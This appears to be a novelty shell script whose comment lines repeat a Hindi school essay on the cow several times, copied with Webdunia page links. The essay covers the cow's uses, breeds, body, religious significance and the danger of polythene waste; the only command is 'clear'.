#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ




clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
